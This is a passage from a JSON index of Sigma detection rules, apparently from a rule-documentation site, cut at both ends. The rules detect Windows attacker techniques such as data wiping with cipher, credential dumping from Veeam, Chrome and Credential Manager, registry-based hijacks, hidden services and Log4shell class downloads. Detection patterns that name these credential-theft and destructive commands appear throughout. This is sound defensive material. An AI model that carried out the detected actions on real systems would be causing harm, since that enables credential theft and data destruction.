","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_schtasks_disable.yml/","tags":["attack.impact","attack.t1489"],"title":"Disable Important Scheduled Task"},{"categories":null,"contents":"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive Raw rule (edit) title: Overwrite Deleted Data with Cipher id: 4b046706-5789-4673-b111-66f25fe99534 status: experimental description: | Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives author: frack113 date: 2021/12/26 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive logsource: category: process_creation product: windows detection: selection: Image|endswith: \\cipher.exe CommandLine|contains: \u0026#39; /w:\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.impact - attack.t1485 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cipher.yml/","tags":["attack.impact","attack.t1485"],"title":"Overwrite Deleted Data with Cipher"},{"categories":null,"contents":"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1531/T1531.md#atomic-test-3---remove-account-from-domain-admin-group Raw rule (edit) title: Remove Account From Domain Admin Group id: 48a45d45-8112-416b-8a67-46e03a4b2107 status: experimental author: frack113 date: 2021/12/26 description: | Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1531/T1531.md#atomic-test-3---remove-account-from-domain-admin-group logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Remove-ADGroupMember\u0026#39; - \u0026#39;-Identity \u0026#39; - \u0026#39;-Members \u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1531 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_remove_adgroupmember.yml/","tags":["attack.impact","attack.t1531"],"title":"Remove Account From Domain Admin Group"},{"categories":null,"contents":"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.md Raw rule (edit) title: Replace Desktop Wallpaper by Powershell id: c5ac6a1e-9407-45f5-a0ce-ca9a0806a287 status: experimental author: frack113 date: 2021/12/26 description: | An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_1: ScriptBlockText|contains|all: - \u0026#39;Get-ItemProperty\u0026#39; - \u0026#39;Registry::\u0026#39; - \u0026#39;HKEY_CURRENT_USER\\Control Panel\\Desktop\\\u0026#39; - \u0026#39;WallPaper\u0026#39; selection_2: ScriptBlockText|contains: SystemParametersInfo(20,0,*,3) condition: 1 of selection_* falsepositives: - Unknown level: low tags: - attack.impact - attack.t1491.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_wallpaper.yml/","tags":["attack.impact","attack.t1491.001"],"title":"Replace Desktop Wallpaper by Powershell"},{"categories":null,"contents":"Ransomware create txt file in the user Desktop\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md#atomic-test-5---purelocker-ransom-note Raw rule (edit) title: Suspicious Creation TXT File in User Desktop id: caf02a0a-1e1c-4552-9b48-5e070bd88d11 status: experimental description: Ransomware create txt file in the user Desktop author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md#atomic-test-5---purelocker-ransom-note date: 2021/12/26 logsource: product: windows category: file_event detection: selection: Image|endswith: \\cmd.exe TargetFilename|contains|all: - \\Users\\ - \\Desktop\\ TargetFilename|endswith: .txt condition: selection falsepositives: - Unknown level: high tags: - attack.impact - attack.t1486 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_desktop_txt.yml/","tags":["attack.impact","attack.t1486"],"title":"Suspicious Creation TXT File in User Desktop"},{"categories":null,"contents":"Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1489/T1489.md#atomic-test-3---windows---stop-service-by-killing-process Raw rule (edit) title: Suspicious Execution of Taskkill id: 86085955-ea48-42a2-9dd3-85d4c36b167d status: experimental description: Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1489/T1489.md#atomic-test-3---windows---stop-service-by-killing-process date: 2021/12/26 logsource: category: process_creation product: windows detection: taskkill: Image|endswith: \\taskkill.exe CommandLine|contains|all: - /f - /im condition: taskkill falsepositives: - Unknown level: low tags: - attack.impact - attack.t1489 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_taskkill.yml/","tags":["attack.impact","attack.t1489"],"title":"Suspicious Execution of Taskkill"},{"categories":null,"contents":"Detects the renaming of an existing computer account to a account name that doesn\u0026rsquo;t contain a $ symbol as seen in attacks against CVE-2021-42287\nKnown false-positives Unknown References https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45 Raw rule (edit) title: Suspicious Computer Account Name Change CVE-2021-42287 id: 45eb2ae2-9aa2-4c3a-99a5-6e5077655466 status: experimental description: Detects the renaming of an existing computer account to a account name that doesn\u0026#39;t contain a $ symbol as seen in attacks against CVE-2021-42287 references: - https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45 author: Florian Roth date: 2021/12/22 logsource: product: windows service: security detection: selection: EventID: 4781 # rename user OldTargetUserName|contains: \u0026#39;$\u0026#39; filter: NewTargetUserName|contains: \u0026#39;$\u0026#39; condition: selection and not filter fields: - EventID - SubjectUserName falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_samaccountname_spoofing_cve_2021_42287.yml/","tags":null,"title":"Suspicious Computer Account Name Change CVE-2021-42287"},{"categories":null,"contents":"Detects Java class download in proxy logs, e.g. used in Log4shell exploitation attacks against Log4j.\nKnown false-positives Unknown References https://www.lunasec.io/docs/blog/log4j-zero-day/ Raw rule (edit) title: Java Class Proxy Download id: 53c15703-b04c-42bb-9055-1937ddfb3392 status: experimental description: Detects Java class download in proxy logs, e.g. used in Log4shell exploitation attacks against Log4j. references: - https://www.lunasec.io/docs/blog/log4j-zero-day/ author: Andreas Hunkeler (@Karneades) date: 2021/12/21 tags: - attack.initial_access logsource: category: proxy detection: selection: c-uri|endswith: \u0026#39;.class\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_java_class_download.yml/","tags":["attack.initial_access"],"title":"Java Class Proxy Download"},{"categories":null,"contents":"Detection of sc.exe utility adding a new service with special permission which hides that service.\nKnown false-positives Intended use of hidden services References https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html https://www.sans.org/blog/red-team-tactics-hiding-windows-services/ Raw rule (edit) title: Abuse of Service Permissions to Hide Services in Tools id: a537cfc3-4297-4789-92b5-345bfd845ad0 status: experimental description: Detection of sc.exe utility adding a new service with special permission which hides that service. author: Andreas Hunkeler (@Karneades) references: - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/ date: 2021/12/20 logsource: category: process_creation product: windows detection: sc: Image|endswith: \u0026#39;\\sc.exe\u0026#39; cli: CommandLine|contains|all: - \u0026#39;sdset\u0026#39; - \u0026#39;DCLCWPDTSD\u0026#39; condition: sc and cli falsepositives: - Intended use of hidden services level: high tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_using_sc_to_hide_sevices.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.t1574.011"],"title":"Abuse of Service Permissions to Hide Services in Tools"},{"categories":null,"contents":"Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key\nKnown false-positives unknown References https://thedfirreport.com/2021/12/13/diavol-ransomware/ Raw rule (edit) title: Suspicious Reg Add Open Command id: dd3ee8cc-f751-41c9-ba53-5a32ed47e563 status: experimental description: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key references: - https://thedfirreport.com/2021/12/13/diavol-ransomware/ author: frack113 date: 2021/12/20 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39;add\u0026#39; - \u0026#39;hkcu\\software\\classes\\ms-settings\\shell\\open\\command\u0026#39; - \u0026#39;/ve \u0026#39; - \u0026#39;/d\u0026#39; selection_2: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39;add\u0026#39; - \u0026#39;hkcu\\software\\classes\\ms-settings\\shell\\open\\command\u0026#39; - \u0026#39;/v\u0026#39; - \u0026#39;DelegateExecute\u0026#39; selection_3: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39;delete\u0026#39; - \u0026#39;hkcu\\software\\classes\\ms-settings\u0026#39; condition: 1 of selection_* falsepositives: - unknown level: medium tags: - attack.credential_access - attack.t1003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_reg_open_command.yml/","tags":["attack.credential_access","attack.t1003"],"title":"Suspicious Reg Add Open Command"},{"categories":null,"contents":"Detects dump of credentials in VeeamBackup dbo\nKnown false-positives Unknown References https://thedfirreport.com/2021/12/13/diavol-ransomware/ https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html Raw rule (edit) title: VeeamBackup Database Credentials Dump id: b57ba453-b384-4ab9-9f40-1038086b4e53 status: experimental author: frack113 date: 2021/12/20 description: Detects dump of credentials in VeeamBackup dbo references: - https://thedfirreport.com/2021/12/13/diavol-ransomware/ - https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html tags: - attack.collection - attack.t1005 logsource: category: process_creation product: windows detection: selection_tools: Image|endswith: \u0026#39;\\sqlcmd.exe\u0026#39; selection_query: CommandLine|contains|all: - \u0026#39;SELECT\u0026#39; - \u0026#39;TOP\u0026#39; - \u0026#39;[VeeamBackup].[dbo].[Credentials]\u0026#39; condition: all of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sqlcmd_veeam_dump.yml/","tags":["attack.collection","attack.t1005"],"title":"VeeamBackup Database Credentials Dump"},{"categories":null,"contents":"Detects Mimikatz MemSSP default log file creation\nKnown false-positives Unlikely References https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ Raw rule (edit) title: Mimikatz MemSSP Default Log File Creation id: 034affe8-6170-11ec-844f-0f78aa0c4d66 status: experimental description: Detects Mimikatz MemSSP default log file creation author: David ANDRE references: - https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ date: 2021/12/20 tags: - attack.credential_access - attack.t1003 logsource: product: windows category: file_event detection: mimikatz_memssp_filename: TargetFilename|endswith: - \u0026#39;mimilsa.log\u0026#39; condition: mimikatz_memssp_filename falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_mimimaktz_memssp_log_file.yml/","tags":["attack.credential_access","attack.t1003"],"title":"Mimikatz MemSSP Default Log File Creation"},{"categories":null,"contents":"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md Raw rule (edit) title: Accessing Encrypted Credentials from Google Chrome Login Database id: 98f4c75c-3089-44f3-b733-b327b9cd9c9d status: deprecated author: frack113 date: 2021/12/20 description: | Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_cmd: ScriptBlockText|contains|all: - Copy-Item - \u0026#39;-Destination\u0026#39; selection_path: ScriptBlockText|contains: - \u0026#39;\\Google\\Chrome\\User Data\\Default\\Login Data\u0026#39; - \u0026#39;\\Google\\Chrome\\User Data\\Default\\Login Data For Account\u0026#39; condition: all of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_access_to_chrome_login_data.yml/","tags":["attack.credential_access","attack.t1555.003"],"title":"Accessing Encrypted Credentials from Google Chrome Login Database"},{"categories":null,"contents":"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md Raw rule (edit) title: Dump Credentials from Windows Credential Manager With PowerShell id: 99c49d9c-34ea-45f7-84a7-4751ae6b2cbc status: experimental author: frack113 date: 2021/12/20 description: | Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_kiddie: ScriptBlockText|contains: - \u0026#39;Get-PasswordVaultCredentials\u0026#39; - \u0026#39;Get-CredManCreds\u0026#39; selection_rename_Password: ScriptBlockText|contains|all: - \u0026#39;New-Object\u0026#39; - \u0026#39;Windows.Security.Credentials.PasswordVault\u0026#39; selection_rename_credman: ScriptBlockText|contains|all: - \u0026#39;New-Object\u0026#39; - \u0026#39;Microsoft.CSharp.CSharpCodeProvider\u0026#39; - \u0026#39;[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())\u0026#39; - \u0026#39;Collections.ArrayList\u0026#39; - \u0026#39;System.CodeDom.Compiler.CompilerParameters\u0026#39; condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_dump_password_windows_credential_manager.yml/","tags":["attack.credential_access","attack.t1555"],"title":"Dump Credentials from Windows Credential Manager With PowerShell"},{"categories":null,"contents":"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md Raw rule (edit) title: Enumerate Credentials from Windows Credential Manager With PowerShell id: 603c6630-5225-49c1-8047-26c964553e0e status: experimental author: frack113 date: 2021/12/20 description: | Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_cmd: ScriptBlockText|contains|all: - vaultcmd - \u0026#39;/listcreds:\u0026#39; selection_option: ScriptBlockText|contains: - \u0026#39;Windows Credentials\u0026#39; - \u0026#39;Web Credentials\u0026#39; condition: all of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_enumerate_password_windows_credential_manager.yml/","tags":["attack.credential_access","attack.t1555"],"title":"Enumerate Credentials from Windows Credential Manager With PowerShell"},{"categories":null,"contents":"Rename as a legitim Sysinternals Suite tools to evade detection\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite Raw rule (edit) title: False Sysinternals Suite Tools id: 7cce6fc8-a07f-4d84-a53e-96e1879843c9 status: experimental description: Rename as a legitim Sysinternals Suite tools to evade detection references: - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite author: frack113 date: 2021/12/20 logsource: category: process_creation product: windows detection: selection_exe: Image|endswith: - \u0026#39;\\accesschk.exe\u0026#39; - \u0026#39;\\accesschk64.exe\u0026#39; - \u0026#39;\\AccessEnum.exe\u0026#39; - \u0026#39;\\ADExplorer.exe\u0026#39; - \u0026#39;\\ADExplorer64.exe\u0026#39; - \u0026#39;\\ADInsight.exe\u0026#39; - \u0026#39;\\ADInsight64.exe\u0026#39; - \u0026#39;\\adrestore.exe\u0026#39; - \u0026#39;\\adrestore64.exe\u0026#39; - \u0026#39;\\Autologon.exe\u0026#39; - \u0026#39;\\Autologon64.exe\u0026#39; - \u0026#39;\\Autoruns.exe\u0026#39; - \u0026#39;\\Autoruns64.exe\u0026#39; - \u0026#39;\\autorunsc.exe\u0026#39; - \u0026#39;\\autorunsc64.exe\u0026#39; - \u0026#39;\\Bginfo.exe\u0026#39; - \u0026#39;\\Bginfo64.exe\u0026#39; - \u0026#39;\\Cacheset.exe\u0026#39; - \u0026#39;\\Cacheset64.exe\u0026#39; - \u0026#39;\\Clockres.exe\u0026#39; - \u0026#39;\\Clockres64.exe\u0026#39; - \u0026#39;\\Contig.exe\u0026#39; - \u0026#39;\\Contig64.exe\u0026#39; - \u0026#39;\\Coreinfo.exe\u0026#39; - \u0026#39;\\Coreinfo64.exe\u0026#39; - \u0026#39;\\CPUSTRES.EXE\u0026#39; - \u0026#39;\\CPUSTRES64.EXE\u0026#39; - \u0026#39;\\ctrl2cap.exe\u0026#39; - \u0026#39;\\Dbgview.exe\u0026#39; - \u0026#39;\\dbgview64.exe\u0026#39; - \u0026#39;\\Desktops.exe\u0026#39; - \u0026#39;\\Desktops64.exe\u0026#39; - \u0026#39;\\disk2vhd.exe\u0026#39; - \u0026#39;\\disk2vhd64.exe\u0026#39; - \u0026#39;\\diskext.exe\u0026#39; - \u0026#39;\\diskext64.exe\u0026#39; - \u0026#39;\\Diskmon.exe\u0026#39; - \u0026#39;\\Diskmon64.exe\u0026#39; - \u0026#39;\\DiskView.exe\u0026#39; - \u0026#39;\\DiskView64.exe\u0026#39; - \u0026#39;\\du.exe\u0026#39; - \u0026#39;\\du64.exe\u0026#39; - \u0026#39;\\efsdump.exe\u0026#39; - \u0026#39;\\FindLinks.exe\u0026#39; - \u0026#39;\\FindLinks64.exe\u0026#39; - \u0026#39;\\handle.exe\u0026#39; - \u0026#39;\\handle64.exe\u0026#39; - \u0026#39;\\hex2dec.exe\u0026#39; - \u0026#39;\\hex2dec64.exe\u0026#39; - \u0026#39;\\junction.exe\u0026#39; - \u0026#39;\\junction64.exe\u0026#39; - \u0026#39;\\ldmdump.exe\u0026#39; - \u0026#39;\\listdlls.exe\u0026#39; - \u0026#39;\\listdlls64.exe\u0026#39; - \u0026#39;\\livekd.exe\u0026#39; - \u0026#39;\\livekd64.exe\u0026#39; - \u0026#39;\\loadOrd.exe\u0026#39; - \u0026#39;\\loadOrd64.exe\u0026#39; - \u0026#39;\\loadOrdC.exe\u0026#39; - \u0026#39;\\loadOrdC64.exe\u0026#39; - \u0026#39;\\logonsessions.exe\u0026#39; - \u0026#39;\\logonsessions64.exe\u0026#39; - \u0026#39;\\movefile.exe\u0026#39; - \u0026#39;\\movefile64.exe\u0026#39; - \u0026#39;\\notmyfault.exe\u0026#39; - \u0026#39;\\notmyfault64.exe\u0026#39; - \u0026#39;\\notmyfaultc.exe\u0026#39; - \u0026#39;\\notmyfaultc64.exe\u0026#39; - \u0026#39;\\ntfsinfo.exe\u0026#39; - \u0026#39;\\ntfsinfo64.exe\u0026#39; - \u0026#39;\\pendmoves.exe\u0026#39; - \u0026#39;\\pendmoves64.exe\u0026#39; - \u0026#39;\\pipelist.exe\u0026#39; - \u0026#39;\\pipelist64.exe\u0026#39; - \u0026#39;\\portmon.exe\u0026#39; - \u0026#39;\\procdump.exe\u0026#39; - \u0026#39;\\procdump64.exe\u0026#39; - \u0026#39;\\procexp.exe\u0026#39; - \u0026#39;\\procexp64.exe\u0026#39; - \u0026#39;\\Procmon.exe\u0026#39; - \u0026#39;\\Procmon64.exe\u0026#39; - \u0026#39;\\psExec.exe\u0026#39; - \u0026#39;\\psExec64.exe\u0026#39; - \u0026#39;\\psfile.exe\u0026#39; - \u0026#39;\\psfile64.exe\u0026#39; - \u0026#39;\\psGetsid.exe\u0026#39; - \u0026#39;\\psGetsid64.exe\u0026#39; - \u0026#39;\\psInfo.exe\u0026#39; - \u0026#39;\\psInfo64.exe\u0026#39; - \u0026#39;\\pskill.exe\u0026#39; - \u0026#39;\\pskill64.exe\u0026#39; - \u0026#39;\\pslist.exe\u0026#39; - \u0026#39;\\pslist64.exe\u0026#39; - \u0026#39;\\psLoggedon.exe\u0026#39; - \u0026#39;\\psLoggedon64.exe\u0026#39; - \u0026#39;\\psloglist.exe\u0026#39; - \u0026#39;\\psloglist64.exe\u0026#39; - \u0026#39;\\pspasswd.exe\u0026#39; - \u0026#39;\\pspasswd64.exe\u0026#39; - \u0026#39;\\psping.exe\u0026#39; - \u0026#39;\\psping64.exe\u0026#39; - \u0026#39;\\psService.exe\u0026#39; - \u0026#39;\\psService64.exe\u0026#39; - \u0026#39;\\psshutdown.exe\u0026#39; - \u0026#39;\\psshutdown64.exe\u0026#39; - \u0026#39;\\pssuspend.exe\u0026#39; - \u0026#39;\\pssuspend64.exe\u0026#39; - \u0026#39;\\RAMMap.exe\u0026#39; - \u0026#39;\\RDCMan.exe\u0026#39; - \u0026#39;\\RegDelNull.exe\u0026#39; - \u0026#39;\\RegDelNull64.exe\u0026#39; - \u0026#39;\\regjump.exe\u0026#39; - \u0026#39;\\ru.exe\u0026#39; - \u0026#39;\\ru64.exe\u0026#39; - \u0026#39;\\sdelete.exe\u0026#39; - \u0026#39;\\sdelete64.exe\u0026#39; - \u0026#39;\\ShareEnum.exe\u0026#39; - \u0026#39;\\ShareEnum64.exe\u0026#39; - \u0026#39;\\shellRunas.exe\u0026#39; - \u0026#39;\\sigcheck.exe\u0026#39; - \u0026#39;\\sigcheck64.exe\u0026#39; - \u0026#39;\\streams.exe\u0026#39; - \u0026#39;\\streams64.exe\u0026#39; - \u0026#39;\\strings.exe\u0026#39; - \u0026#39;\\strings64.exe\u0026#39; - \u0026#39;\\sync.exe\u0026#39; - \u0026#39;\\sync64.exe\u0026#39; - \u0026#39;\\Sysmon.exe\u0026#39; - \u0026#39;\\Sysmon64.exe\u0026#39; - \u0026#39;\\tcpvcon.exe\u0026#39; - \u0026#39;\\tcpvcon64.exe\u0026#39; - \u0026#39;\\tcpview.exe\u0026#39; - \u0026#39;\\tcpview64.exe\u0026#39; - \u0026#39;\\Testlimit.exe\u0026#39; - \u0026#39;\\Testlimit64.exe\u0026#39; - \u0026#39;\\vmmap.exe\u0026#39; - \u0026#39;\\vmmap64.exe\u0026#39; - \u0026#39;\\Volumeid.exe\u0026#39; - \u0026#39;\\Volumeid64.exe\u0026#39; - \u0026#39;\\whois.exe\u0026#39; - \u0026#39;\\whois64.exe\u0026#39; - \u0026#39;\\Winobj.exe\u0026#39; - \u0026#39;\\Winobj64.exe\u0026#39; - \u0026#39;\\ZoomIt.exe\u0026#39; - \u0026#39;\\ZoomIt64.exe\u0026#39; filter_valid: Company: - \u0026#39;Sysinternals - www.sysinternals.com\u0026#39; - \u0026#39;Sysinternals\u0026#39; filter_empty: Company: null condition: selection_exe and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_false_sysinternalsuite.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218","attack.t1202"],"title":"False Sysinternals Suite Tools"},{"categories":null,"contents":"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md Raw rule (edit) title: Extracting Information with PowerShell id: bd5971a7-626d-46ab-8176-ed643f694f68 status: experimental author: frack113 date: 2021/12/19 description: | Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - ls - \u0026#39; -R\u0026#39; - \u0026#39;select-string \u0026#39; - \u0026#39;-Pattern \u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_extracting.yml/","tags":["attack.credential_access","attack.t1552.001"],"title":"Extracting Information with PowerShell"},{"categories":null,"contents":"Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md Raw rule (edit) title: Suspicious Unattend.xml File Access id: 1a3d42dd-3763-46b9-8025-b5f17f340dfb status: experimental description: | Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md date: 2021/12/19 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;\\unattend.xml\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_access_susp_unattend_xml.yml/","tags":["attack.credential_access","attack.t1552.001"],"title":"Suspicious Unattend.xml File Access"},{"categories":null,"contents":"Threat actors can use the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery.\nKnown false-positives Another tool that uses the command line switches of PsLogList Legitimate use of PsLogList by an administrator References https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/ https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList Raw rule (edit) title: Suspicious Use of PsLogList id: aae1243f-d8af-40d8-ab20-33fc6d0c55bc description: Threat actors can use the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery. status: experimental references: - https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/ - https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 tags: - attack.discovery - attack.t1087 - attack.t1087.001 - attack.t1087.002 logsource: category: process_creation product: windows detection: selection1: OriginalFileName|contains: \u0026#39;psloglist\u0026#39; selection2: Image|endswith: - \u0026#39;\\psloglist.exe\u0026#39; - \u0026#39;\\psloglist64.exe\u0026#39; flags: CommandLine|contains: - \u0026#39;-d\u0026#39; - \u0026#39;/d\u0026#39; - \u0026#39;-x\u0026#39; - \u0026#39;/x\u0026#39; - \u0026#39;-s\u0026#39; - \u0026#39;/s\u0026#39; other: CommandLine|contains|all: - \u0026#39;security\u0026#39; - \u0026#39;accepteula\u0026#39; condition: (1 of selection*) or (flags and other) falsepositives: - Another tool that uses the command line switches of PsLogList - Legitimate use of PsLogList by an administrator level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_psloglist.yml/","tags":["attack.discovery","attack.t1087","attack.t1087.001","attack.t1087.002"],"title":"Suspicious Use of PsLogList"},{"categories":null,"contents":"Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nKnown false-positives Unknown References https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol Raw rule (edit) title: Suspicious NT Resource Kit Auditpol Usage id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e description: Threat actors can use an older 